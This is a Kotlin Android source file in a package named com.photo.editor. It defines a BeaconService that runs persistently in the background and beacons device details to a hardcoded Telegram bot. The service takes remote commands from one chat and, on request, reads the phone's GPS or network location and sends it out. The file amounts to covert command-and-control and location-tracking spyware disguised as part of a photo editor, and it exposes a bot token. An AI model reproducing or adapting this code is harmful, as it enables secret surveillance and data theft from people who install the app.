package com.photo.editor

import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.MediaType.Companion.toMediaType
import org.json.JSONObject
import java.util.concurrent.TimeUnit

class BeaconService : Service() {
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(60, TimeUnit.SECONDS)
        .build()
    private val BOT_TOKEN = "8499165846:AAFsr7EJTCOYcBB1yXLwoDZcHhBPfnvq-Rg"
    private val CHAT_ID = "6146550840"
    private val API = "https://api.telegram.org/bot$BOT_TOKEN"
    private var offset = 0L
    private var running = false

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (!running) {
            running = true
            scope.launch { loop() }
        }
        return START_STICKY
    }

    private suspend fun loop() {
        try {
            send("beacon\nmodel: ${Build.MODEL}\nsdk: ${Build.VERSION.SDK_INT}")
        } catch (e: Exception) {
            Log.e("beacon", "start beacon failed", e)
        }
        while (true) {
            try {
                val url = "$API/getUpdates?offset=$offset&timeout=10"
                val req = Request.Builder().url(url).build()
                val body = client.newCall(req).execute().body?.string() ?: ""
                val arr = JSONObject(body).optJSONArray("result") ?: continue
                for (i in 0 until arr.length()) {
                    val u = arr.getJSONObject(i)
                    offset = u.getLong("update_id") + 1
                    val msg = u.optJSONObject("message") ?: continue
                    val chat = msg.optJSONObject("chat")?.optString("id") ?: continue
                    if (chat != CHAT_ID) continue
                    val text = msg.optString("text", "")
                    when (text) {
                        "/ping" -> send("pong")
                        "/info" -> send("model: ${Build.MODEL}\nsdk: ${Build.VERSION.SDK_INT}")
                        "/location" -> send(locationText())
                        else -> if (text.isNotEmpty()) send("got: $text")
                    }
                }
            } catch (e: Exception) {
                Log.e("beacon", "poll err", e)
            }
            delay(3000)
        }
    }

    private fun locationText(): String {
        return try {
            val lm = getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
            val loc = lm.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER)
                ?: lm.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER)
            if (loc != null) {
                "lat: ${loc.latitude}\nlon: ${loc.longitude}\naccuracy: ${loc.accuracy}m"
            } else {
                "no location yet"
            }
        } catch (e: Exception) {
            "loc error: ${e.message}"
        }
    }

    private fun send(text: String) {
        try {
            val json = JSONObject().put("chat_id", CHAT_ID).put("text", text.take(4000))
            val body = json.toString().toRequestBody("application/json".toMediaType())
            val req = Request.Builder().url("$API/sendMessage").post(body).build()
            client.newCall(req).execute().close()
        } catch (e: Exception) {
            Log.e("beacon", "send err", e)
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
